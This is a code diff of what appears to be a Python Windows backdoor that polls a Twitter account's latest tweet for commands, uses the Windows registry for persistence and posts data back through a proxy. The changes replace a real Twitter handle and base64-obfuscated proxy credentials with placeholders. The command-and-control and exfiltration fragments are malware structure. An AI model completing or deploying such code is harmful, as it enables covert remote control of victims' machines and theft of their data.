@@ -1,4 +1,3 @@
-import base64
 import requests
 import subprocess
 import time
@@ -8,13 +7,13 @@ import _winreg as wreg
 import random
 from bs4 import BeautifulSoup
 
-url = "http://twitter.com/thekiranbedi"
+url = "<twitter url of your account>"
 tweetNumberFromTopRecent = 0        # the topmost tweet
 
 
 def commandFromTwitter(url):
     response = requests.get(url=url, proxies={
-        'http': "http://" + base64.b64decode(u) + ":" + base64.b64decode(p) + "@172.31.1.6:8080"})
+        'http': "http://username:password@proxyaddress:proxyport"})
     soup = BeautifulSoup(response.text, 'html.parser')
     # For parsing the first tweet
     command = soup.find_all("p", {"class": "js-tweet-text"})[tweetNumberFromTopRecent].contents[0]
@@ -40,11 +39,8 @@ def persistence():
 
 
 def sendPost(Url, data, files=None):
-    token = "cml0MjAxNTA0NA==SWlpdGEwNDQ="
-    u, p = token.split('==')
-    u += "=="
     response = requests.post(url=Url, data=data, proxies={
-        'http': "http://" + base64.b64decode(u) + ":" + base64.b64decode(p) + "@172.31.1.6:8080"})
+        'http': "http://username:password@proxyaddress:proxyport"})
     return response
 
 
